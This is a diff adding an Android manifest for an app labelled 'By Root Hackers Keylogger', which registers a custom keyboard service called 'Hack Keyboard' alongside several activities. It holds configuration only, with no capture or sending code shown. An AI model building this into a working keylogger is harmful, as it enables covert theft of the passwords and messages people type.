@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" package="hack.hackit.pankaj.keyboardlisten" platformBuildVersionCode="21" platformBuildVersionName="5.0.1-1624448">
+	<uses-sdk android:minSdkVersion="15" android:targetSdkVersion="21" />
+	<uses-permission android:name="android.permission.GET_TASKS" />
+	<application android:theme="resourceId:0x7f0d0005" android:label="By Root Hackers Keylogger" android:icon="res/drawable-xxhdpi-v4/logosample1.png" android:name="hack.hackit.pankaj.keyboardlisten.HKApplication" android:allowBackup="true">
+		<activity android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" android:label="By Root Hackers Keylogger" android:name="hack.hackit.pankaj.keyboardlisten.WelcomeScreen" android:screenOrientation="portrait" />
+		<activity android:label="By Root Hackers Keylogger" android:name="hack.hackit.pankaj.keyboardlisten.Help" android:screenOrientation="portrait" />
+		<activity android:theme="resourceId:0x7f0d0005" android:label="By Root Hackers Keylogger" android:name="hack.hackit.pankaj.keyboardlisten.MainActivity" android:screenOrientation="portrait">
+			<meta-data android:name="android.app.default_searchable" android:value="hack.hackit.pankaj.keyboardlisten.SearchableActivity" />
+		</activity>
+		<activity android:theme="resourceId:0x7f0d00dd" android:label="By Root Hackers Keylogger" android:name="hack.hackit.pankaj.keyboardlisten.ShowTextDialog" android:screenOrientation="portrait" />
+		<activity android:theme="resourceId:0x7f0d0004" android:label="Settings" android:name="hack.hackit.pankaj.keyboardlisten.Settings" android:screenOrientation="portrait" />
+		<activity android:theme="resourceId:0x7f0d0082" android:label="By Root Hackers Keylogger" android:name="hack.hackit.pankaj.keyboardlisten.startingDialog" android:screenOrientation="portrait">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN" />
+				<category android:name="android.intent.category.LAUNCHER" />
+			</intent-filter>
+		</activity>
+		<activity android:theme="resourceId:0x7f0d0005" android:name="hack.hackit.pankaj.keyboardlisten.SearchableActivity" android:screenOrientation="portrait">
+			<intent-filter>
+				<action android:name="android.intent.action.SEARCH" />
+				<category android:name="android.intent.category.DEFAULT" />
+			</intent-filter>
+			<meta-data android:name="android.app.searchable" android:resource="res/xml/searchable.xml" />
+		</activity>
+		<service android:label="Hack Keyboard" android:name="hack.hackit.pankaj.keyboardlisten.HackingKeyBoard" android:permission="android.permission.BIND_INPUT_METHOD">
+			<meta-data android:name="android.view.im" android:resource="res/xml/method.xml" />
+			<intent-filter>
+				<action android:name="android.view.InputMethod" />
+			</intent-filter>
+		</service>
+	</application>
+</manifest>
